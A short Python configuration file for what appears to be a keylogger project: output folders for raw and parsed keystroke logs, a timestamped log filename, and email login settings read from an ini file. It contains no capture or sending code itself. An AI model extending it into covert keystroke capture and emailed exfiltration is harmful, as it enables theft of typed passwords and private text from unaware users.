import datetime
import os
import platform
import glob
import configparser

WRITE_KEYLOG_OUTPATH = 'keylogs/raw_keylogs'
WRITE_KEYLOG_FILENAME =  'keylog_' + str(datetime.datetime.today()).replace(' ', '') + '.txt'

##### parse keylogged params #####

READ_KEYLOGGED_DIR = 'keylogs/raw_keylogs/'
WRITE_KEYLOGGED_DIR = 'keylogs/parsed_keylogs/'

##### email params #####

EMAIL_LOGIN_INFO = configparser.ConfigParser()
EMAIL_LOGIN_INFO.read('/home/melgazar9/email_login_info.ini')

KEYLOG_FILES = glob.glob('./{}/*.py'.format(WRITE_KEYLOG_OUTPATH))
